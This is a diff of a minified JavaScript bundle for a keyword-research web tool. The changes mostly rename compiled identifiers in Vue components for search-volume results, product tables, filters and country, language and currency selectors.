+            }, [r.user_is_paid ? (b(), g("span", Vx, "...")) : (b(), g("span", Hx, "88,888"))], 64)) : (b(), g("span", Ix, "..."))], 64))])) : T("", !0)], 2), r.current_permissions.show_relative_popularity_data || r.current_permissions.show_search_frequency_increase_data ? (b(), g("tr", Nx, [Bx, S("td", {
                 colspan: "8",
                 id: "chart_" + s.id
-            }, null, 8, Kx)])) : T("", !0)], 64)))), 128))])) : T("", !0)])])
+            }, null, 8, Rx)])) : T("", !0)], 64)))), 128))])) : T("", !0)])])
         }]
     ]),
-    Wx = {
+    Jx = {
         components: {},
         props: {
             loading: {
@@ -12827,18 +12838,18 @@ const Jx = Ue(by, [
     PC = {
         class: "row"
     },
-    LC = {
+    $C = {
         class: "col-2"
     },
-    BC = {
+    LC = {
         class: "figure position-relative text-center w-100"
     },
-    $C = ["src", "alt", "title"],
-    DC = ["src"],
+    DC = ["src", "alt", "title"],
+    jC = ["src"],
     OC = {
         class: "col"
     },
-    jC = ["innerHTML"],
+    WC = ["innerHTML"],
     VC = {
         key: 0,
         class: "col-product-asin"
@@ -12852,13 +12863,13 @@ const Jx = Ue(by, [
     NC = {
         key: 0
     },
-    RC = ["href"],
-    KC = {
+    BC = ["href"],
+    RC = {
         key: 1,
         class: "text-secondary"
     },
-    JC = ["data-bs-content"],
-    WC = {
+    KC = ["data-bs-content"],
+    JC = {
         key: 1,
         class: "text-blur"
     },
@@ -12970,8 +12981,8 @@ const FS = {
         components: {
             "google-search-volume-summary": zg,
             "product-summary": iy,
-            "google-search-volume-result": Jx,
-            "product-result": Ue(Wx, [
+            "google-search-volume-result": Kx,
+            "product-result": Ue(Jx, [
                 ["render", function(e, t, r, s, a, o) {
                     return b(), g("table", zx, [S("thead", null, [S("th", Yx, [F(S("input", {
                         type: "checkbox",
@@ -13009,31 +13020,31 @@ const FS = {
                     ])]), S("td", {
                         class: "col-product-name cursor-pointer d-sm-none d-md-block",
                         onClick: e => o.toggle_select_keyword(s.keyword_source)
-                    }, [S("div", PC, [S("div", LC, [S("figure", BC, [s.img ? (b(), g("img", {
+                    }, [S("div", PC, [S("div", $C, [S("figure", LC, [s.img ? (b(), g("img", {
                         key: 0,
                         src: s.img,
                         alt: s.keyword,
                         title: s.keyword,
                         class: "figure-img img-fluid img-thumbnail rounded m-0"
-                    }, null, 8, $C)) : T("", !0), s.is_prime ? (b(), g("img", {
+                    }, null, 8, DC)) : T("", !0), s.is_prime ? (b(), g("img", {
                         key: 1,
                         src: "/images/amazon-prime.png",
                         alt: "Amazon Prime",
                         class: "amazon-prime-badge position-absolute bottom-0 start-0 mb-3 ms-3 rounded p-1 opacity-75"
-                    }, null, 8, DC)) : T("", !0)])]), S("div", OC, [S("div", {
+                    }, null, 8, jC)) : T("", !0)])]), S("div", OC, [S("div", {
                         class: "fw-normal",
                         innerHTML: s.keyword
-                    }, null, 8, jC)])])], 8, AC), r.current_permissions.show_product_column ? (b(), g("td", VC, [r.has_metrics && void 0 !== s.asin ? (b(), g("span", HC, [r.current_permissions.show_product_data ? (b(), g("span", IC, [s.asin && null !== s.asin ? (b(), g("span", NC, [S("a", {
+                    }, null, 8, WC)])])], 8, AC), r.current_permissions.show_product_column ? (b(), g("td", VC, [r.has_metrics && void 0 !== s.asin ? (b(), g("span", HC, [r.current_permissions.show_product_data ? (b(), g("span", IC, [s.asin && null !== s.asin ? (b(), g("span", NC, [S("a", {
                         href: s.url,
                         target: "_blank",
                         rel: "noopener"
-                    }, v(s.asin), 9, RC)])) : (b(), g("span", KC, [S("span", {
+                    }, v(s.asin), 9, BC)])) : (b(), g("span", RC, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
                         "data-bs-toggle": "popover",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, JC)]))])) : (b(), g("span", WC, "888"))])) : (b(), g(y, {
+                    }, "-", 8, KC)]))])) : (b(), g("span", JC, "888"))])) : (b(), g(y, {
                         key: 1
                     }, [r.has_metrics ? (b(), g(y, {
                         key: 0
@@ -13220,25 +13231,25 @@ const FS = {
         key: 1,
         class: "search-results-settings-display-price-value"
     },
-    LS = {
+    $S = {
         key: 2,
         class: "search-results-settings-display-price-value"
     },
-    BS = {
+    LS = {
         key: 0,
         class: "row"
     },
-    $S = {
+    DS = {
         class: "col"
     },
-    DS = {
+    jS = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
     OS = {
         key: 1,
         class: "row"
     },
-    jS = {
+    WS = {
         class: "col-12 col-md-6"
     },
     VS = {
@@ -13252,17 +13263,17 @@ const FS = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    RS = {
+    BS = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    KS = {
+    RS = {
         class: "form-label search-results-settings-modal-currency-label"
     },
-    JS = {
+    KS = {
         key: 2,
         class: "row"
     },
-    WS = {
+    JS = {
         key: 0,
         class: "col-12 col-md-6"
     },
@@ -13396,18 +13407,18 @@ const MT = Ue(FS, [
                 q = k("search-results-settings-modal-search-network"),
                 M = k("search-results-settings-modal-currency"),
                 A = k("search-results-settings-modal-search-volume"),
-                $ = k("search-results-settings-modal-search-volume-trend"),
-                D = k("search-results-settings-modal-average-cpc"),
+                D = k("search-results-settings-modal-search-volume-trend"),
+                j = k("search-results-settings-modal-average-cpc"),
                 O = k("search-results-settings-modal-bing-competition"),
-                j = k("search-results-settings-modal-competition"),
+                W = k("search-results-settings-modal-competition"),
                 V = k("search-results-settings-filter-positive-keywords"),
                 H = k("search-results-settings-filter-negative-keywords"),
                 I = k("search-results-settings-admin-settings"),
                 N = k("search-results-settings-modal"),
-                R = k("search-results-tabs"),
-                K = k("has-error"),
-                J = k("suggest-page-reload"),
-                W = k("product-summary"),
+                B = k("search-results-tabs"),
+                R = k("has-error"),
+                K = k("suggest-page-reload"),
+                J = k("product-summary"),
                 z = k("google-search-volume-summary"),
                 Y = k("show-upsell"),
                 G = k("product-result"),
@@ -13423,7 +13434,7 @@ const MT = Ue(FS, [
                 ie = k("dropdown-menu-item-copy-keywords-search-volume"),
                 ne = k("dropdown-menu-item-copy-keywords-all-data"),
                 le = k("search-results-actions"),
-                ce = L("mask");
+                ce = $("mask");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
             }, null, 8, ["loading"]), 11 != e.current_tab || 11 == e.current_tab && a.allow_product_filter ? (b(), g("div", qS, [S("div", ES, [E(n, {
@@ -13463,7 +13474,7 @@ const MT = Ue(FS, [
                 show_current_filter_competition_max: e.show_current_filter_competition_max
             }, null, 8, ["onClearFilter", "current_permissions", "show_current_filter_competition_min", "show_current_filter_competition_max"])), e.current_permissions.show_product_data ? (b(), g(y, {
                 key: 2
-            }, [e.show_current_filter_price_min > 0 || e.show_current_filter_price_max > 0 ? (b(), g("button", US, [S("strong", MS, v(e.trans.get("Price")) + ":", 1), e.show_current_filter_price_min > 0 && e.show_current_filter_price_max > 0 ? (b(), g("span", AS, v(e.$filters.decimal(e.show_current_filter_price_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.decimal(e.show_current_filter_price_max)), 1)) : e.show_current_filter_price_min > 0 && !e.show_current_filter_price_max ? (b(), g("span", PS, v(e.trans.get("more than")) + " " + v(e.$filters.decimal(e.show_current_filter_price_min)), 1)) : !e.show_current_filter_price_min && e.show_current_filter_price_max > 0 ? (b(), g("span", LS, v(e.trans.get("less than")) + " " + v(e.$filters.decimal(e.show_current_filter_price_max)), 1)) : T("", !0), S("a", {
+            }, [e.show_current_filter_price_min > 0 || e.show_current_filter_price_max > 0 ? (b(), g("button", US, [S("strong", MS, v(e.trans.get("Price")) + ":", 1), e.show_current_filter_price_min > 0 && e.show_current_filter_price_max > 0 ? (b(), g("span", AS, v(e.$filters.decimal(e.show_current_filter_price_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.decimal(e.show_current_filter_price_max)), 1)) : e.show_current_filter_price_min > 0 && !e.show_current_filter_price_max ? (b(), g("span", PS, v(e.trans.get("more than")) + " " + v(e.$filters.decimal(e.show_current_filter_price_min)), 1)) : !e.show_current_filter_price_min && e.show_current_filter_price_max > 0 ? (b(), g("span", $S, v(e.trans.get("less than")) + " " + v(e.$filters.decimal(e.show_current_filter_price_max)), 1)) : T("", !0), S("a", {
                 onClick: t[0] || (t[0] = t => e.clearFilter("price")),
                 class: "search-results-settings-display-price-remove ms-1 text-decoration-none",
                 href: "javascript:;"
@@ -13484,19 +13495,19 @@ const MT = Ue(FS, [
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", BS, [S("div", $S, [S("h5", DS, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", OS, [S("div", jS, [S("div", VS, [S("label", HS, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", LS, [S("div", DS, [S("h5", jS, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", OS, [S("div", WS, [S("div", VS, [S("label", HS, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, IS)])]), e.current_permissions.show_currency_settings ? (b(), g("div", NS, [S("div", RS, [S("label", KS, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, IS)])]), e.current_permissions.show_currency_settings ? (b(), g("div", NS, [S("div", BS, [S("label", RS, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", JS, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", WS, [E(q, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", KS, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", JS, [E(q, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[1] || (t[1] = t => e.current_metrics_network = t),
@@ -13514,7 +13525,7 @@ const MT = Ue(FS, [
                     "onUpdate:current_filter_search_volume_min": t[3] || (t[3] = t => e.current_filter_search_volume_min = t),
                     current_filter_search_volume_max: e.current_filter_search_volume_max,
                     "onUpdate:current_filter_search_volume_max": t[4] || (t[4] = t => e.current_filter_search_volume_max = t)
-                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E($, {
+                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E(D, {
                     current_permissions: e.current_permissions,
                     search_volume_trend_format: e.search_volume_trend_format,
                     error_fields: e.error_fields,
@@ -13522,7 +13533,7 @@ const MT = Ue(FS, [
                     "onUpdate:current_filter_search_volume_trend_min": t[5] || (t[5] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[6] || (t[6] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])])) : T("", !0), S("div", eT, [E(D, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])])) : T("", !0), S("div", eT, [E(j, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -13535,7 +13546,7 @@ const MT = Ue(FS, [
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[9] || (t[9] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(j, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(W, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -13600,20 +13611,20 @@ const MT = Ue(FS, [
                     reset_all_metrics_url: e.current_reset_all_metrics_url
                 }, null, 8, ["current_permissions", "current_filter_keyword_result_period", "current_keyword_result_periods", "search_engine", "current_tab", "reset_keywords_url", "reset_latest_metrics_url", "reset_all_metrics_url"])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])])) : T("", !0), E(R, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])])) : T("", !0), E(B, {
                 onApplyTab: o.applyTab,
                 tabs: e.tabs,
                 current_tab: e.current_tab,
                 loading: e.loading
-            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(K, {
+            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(R, {
                 key: 1,
                 user_is_paid: e.user_is_paid,
                 has_metrics: e.has_metrics,
                 onFetch: o.fetch,
                 current_tab: e.current_tab
-            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(J, {
+            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(K, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", CT, [S("div", ST, [11 == e.current_tab ? (b(), x(W, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", CT, [S("div", ST, [11 == e.current_tab ? (b(), x(J, {
                 key: 0,
                 loading: e.loading,
                 current_tab: e.current_tab,
@@ -13636,7 +13647,7 @@ const MT = Ue(FS, [
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
             ]), S("div", TT, [E(Q, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
@@ -13770,7 +13781,7 @@ const MT = Ue(FS, [
         },
         async created() {
             this.id = se(), this.search_type = window.param("search_type"), this.language_settings = {
-                containerCssClass: this.container_css_class + " language-dropdown form-control rounded-top-start-md-0 rounded-bottom-start-md-0 rounded-top-end-lg-0 rounded-bottom-end-lg-0 pe-3",
+                containerCssClass: this.container_css_class + " language-dropdown form-control rounded-top-start-lg-0 rounded-bottom-start-lg-0 rounded-top-end-lg-0 rounded-bottom-end-lg-0 pe-3",
                 create: !1,
                 allowEmptyOption: !1,
                 duplicates: !1,
@@ -13816,10 +13827,10 @@ const MT = Ue(FS, [
     PT = {
         class: "row g-0 me-lg-n1px"
     },
-    LT = {
+    $T = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const BT = Ue({
+const LT = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -13832,7 +13843,7 @@ const BT = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", PT, [S("div", LT, [E(i, {
+            return b(), g("div", PT, [S("div", $T, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -13857,7 +13868,7 @@ const BT = Ue({
             ])])])
         }]
     ]),
-    $T = {
+    DT = {
         mixins: [],
         data: () => ({
             cloud_search_cancel_token: null
@@ -13949,8 +13960,8 @@ const BT = Ue({
             locationTextFormat: e => e.canonical_name + " (" + e.location_type + ")"
         }
     },
-    DT = {
-        mixins: [$T],
+    jT = {
+        mixins: [DT],
         components: {},
         props: {
             location_country_only: {
@@ -14122,14 +14133,14 @@ const BT = Ue({
     OT = {
         class: "row g-0 me-lg-n1px"
     },
-    jT = {
+    WT = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
     VT = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
 const HT = Ue({
-        mixins: [DT],
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/amazon/languages",
@@ -14154,7 +14165,7 @@ const HT = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", OT, [S("div", jT, [E(i, {
+            return b(), g("div", OT, [S("div", WT, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -14345,15 +14356,15 @@ const HT = Ue({
         }
     },
     NT = ["value"],
-    RT = ["value"],
-    KT = {
+    BT = ["value"],
+    RT = {
         key: 2,
         class: "row"
     },
-    JT = {
+    KT = {
         class: "col-12"
     },
-    WT = {
+    JT = {
         class: "check-search-volume-amazon-settings-country mb-3"
     },
     zT = {
@@ -14387,7 +14398,7 @@ const ZT = Ue({
             name: "metrics_currency",
             type: "hidden",
             value: e.currency
-        }, null, 8, RT)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", KT, [S("div", JT, [S("div", WT, [S("label", zT, v(e.trans.get("Country")), 1), E(i, {
+        }, null, 8, BT)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", RT, [S("div", KT, [S("div", JT, [S("label", zT, v(e.trans.get("Country")), 1), E(i, {
             options: e.current_country_list,
             settings: e.country_settings,
             class: "check-search-volume-amazon-settings-country-value",
@@ -14534,7 +14545,7 @@ const PF = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -14589,19 +14600,19 @@ const PF = Ue({
                 M = k("search-results-settings-modal-currency"),
                 A = k("search-results-settings-modal-search-volume"),
                 P = k("search-results-settings-modal-search-volume-trend"),
-                L = k("search-results-settings-modal-average-cpc"),
-                $ = k("search-results-settings-modal-bing-competition"),
-                D = k("search-results-settings-modal-competition"),
+                $ = k("search-results-settings-modal-average-cpc"),
+                D = k("search-results-settings-modal-bing-competition"),
+                j = k("search-results-settings-modal-competition"),
                 O = k("search-results-settings-filter-positive-keywords"),
-                j = k("search-results-settings-filter-negative-keywords"),
+                W = k("search-results-settings-filter-negative-keywords"),
                 V = k("alert-pro-upsell"),
                 H = k("search-results-settings-admin-settings"),
                 I = k("search-results-settings-modal"),
                 N = k("search-results-tabs"),
-                R = k("has-error"),
-                K = k("suggest-page-reload"),
-                J = k("google-search-volume-summary"),
-                W = k("show-upsell"),
+                B = k("has-error"),
+                R = k("suggest-page-reload"),
+                K = k("google-search-volume-summary"),
+                J = k("show-upsell"),
                 z = k("google-search-volume-result"),
                 Y = k("search-results-table-wrapper"),
                 G = k("search-results-no-keyword-found"),
@@ -14714,7 +14725,7 @@ const PF = Ue({
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", kF, [E(L, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", kF, [E($, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -14722,12 +14733,12 @@ const PF = Ue({
                     "onUpdate:current_filter_average_cpc_min": t[6] || (t[6] = t => e.current_filter_average_cpc_min = t),
                     current_filter_average_cpc_max: e.current_filter_average_cpc_max,
                     "onUpdate:current_filter_average_cpc_max": t[7] || (t[7] = t => e.current_filter_average_cpc_max = t)
-                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x($, {
+                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x(D, {
                     key: 0,
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(D, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(j, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -14745,7 +14756,7 @@ const PF = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", SF, [S("div", TF, [E(j, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", SF, [S("div", TF, [E(W, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -14783,15 +14794,15 @@ const PF = Ue({
                 tabs: e.tabs,
                 current_tab: e.current_tab,
                 loading: e.loading
-            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(R, {
+            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(B, {
                 key: 0,
                 user_is_paid: e.user_is_paid,
                 has_metrics: e.has_metrics,
                 onFetch: o.fetch,
                 current_tab: e.current_tab
-            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(K, {
+            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(R, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", EF, [S("div", UF, [E(J, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", EF, [S("div", UF, [E(K, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -14799,12 +14810,12 @@ const PF = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(W, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(J, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"])) : T("", !0)])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
             ]), S("div", MF, [E(Y, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
@@ -14887,13 +14898,13 @@ const PF = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    LF = {
+    $F = {
         class: "row g-0 me-lg-n1px"
     },
-    BF = {
+    LF = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const $F = Ue({
+const DF = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -14906,7 +14917,7 @@ const $F = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", LF, [S("div", BF, [E(i, {
+            return b(), g("div", $F, [S("div", LF, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -14931,17 +14942,17 @@ const $F = Ue({
             ])])])
         }]
     ]),
-    DF = {
+    jF = {
         class: "row g-0 me-lg-n1px"
     },
     OF = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    jF = {
+    WF = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
 const VF = Ue({
-        mixins: [DT],
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/app-store/languages",
@@ -14959,7 +14970,7 @@ const VF = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", DF, [S("div", OF, [E(i, {
+            return b(), g("div", jF, [S("div", OF, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -14975,7 +14986,7 @@ const VF = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", jF, [E(i, {
+            ])]), S("div", WF, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -14994,16 +15005,16 @@ const VF = Ue({
         key: 2,
         class: "row"
     },
-    RF = {
+    BF = {
         class: "col-12"
     },
-    KF = {
+    RF = {
         class: "check-search-volume-settings-country mb-3"
     },
-    JF = {
+    KF = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    WF = {
+    JF = {
         key: 3,
         class: "row"
     },
@@ -15031,7 +15042,7 @@ const XF = Ue({
             name: "metrics_currency",
             type: "hidden",
             value: e.currency
-        }, null, 8, IF)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", NF, [S("div", RF, [S("div", KF, [S("label", JF, v(e.trans.get("Country")), 1), E(i, {
+        }, null, 8, IF)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", NF, [S("div", BF, [S("div", RF, [S("label", KF, v(e.trans.get("Country")), 1), E(i, {
             options: e.current_country_list,
             settings: e.country_settings,
             class: "check-search-volume-settings-country-value",
@@ -15039,7 +15050,7 @@ const XF = Ue({
             "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
             "model-value": e.current_metrics_country,
             placeholder: e.trans.get("Type a country")
-        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", WF, [S("div", zF, [S("div", YF, [S("label", GF, v(e.trans.get("Currency")), 1), E(i, {
+        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", JF, [S("div", zF, [S("div", YF, [S("label", GF, v(e.trans.get("Currency")), 1), E(i, {
             options: e.current_currency_list,
             settings: e.currency_settings,
             class: "check-search-volume-settings-currency-value",
@@ -15268,22 +15279,22 @@ const QF = Ue({
         key: 1,
         class: "text-muted"
     },
-    Lq = ["data-bs-content"],
-    Bq = {
+    $q = ["data-bs-content"],
+    Lq = {
         key: 1,
         class: "search-results-summary-average-trend-value text-blur h3"
     },
-    $q = {
+    Dq = {
         key: 0,
         class: "col my-1"
     },
-    Dq = {
+    jq = {
         key: 0
     },
     Oq = {
         class: "search-results-summary-average-cpc-label"
     },
-    jq = ["data-bs-content"],
+    Wq = ["data-bs-content"],
     Vq = {
         key: 0,
         class: "search-results-summary-average-cpc-value h3"
@@ -15296,17 +15307,17 @@ const QF = Ue({
         class: "text-muted"
     },
     Nq = ["data-bs-content"],
-    Rq = {
+    Bq = {
         key: 1,
         class: "search-results-summary-average-cpc-value text-blur h3"
     },
-    Kq = {
+    Rq = {
         class: "col my-1"
     },
-    Jq = {
+    Kq = {
         key: 0
     },
-    Wq = {
+    Jq = {
         class: "search-results-summary-average-competition-label"
     },
     zq = ["data-bs-content"],
@@ -15383,7 +15394,7 @@ const lE = Ue(ZF, [
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Lq)]))])) : (b(), g("div", Bq, "88%"))])) : T("", !0)]), 12 != r.current_tab ? (b(), g("div", $q, [r.current_permissions.show_cpc_column ? (b(), g("div", Dq, [S("div", Oq, [P(v(e.trans.get("Average CPC")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
+            }, "-", 8, $q)]))])) : (b(), g("div", Lq, "88%"))])) : T("", !0)]), 12 != r.current_tab ? (b(), g("div", Dq, [r.current_permissions.show_cpc_column ? (b(), g("div", jq, [S("div", Oq, [P(v(e.trans.get("Average CPC")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
                 key: 0
             }, [P("(" + v(r.current_metrics_currency) + ")", 1)], 64)) : T("", !0), S("i", {
                 class: "bi bi-info-circle-fill ms-1",
@@ -15391,13 +15402,13 @@ const lE = Ue(ZF, [
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, jq)]), r.current_permissions.show_cpc_data ? (b(), g("div", Vq, [r.summaries.average_cpc_format ? (b(), g("div", Hq, v(r.summaries.average_cpc_format), 1)) : (b(), g("div", Iq, [S("span", {
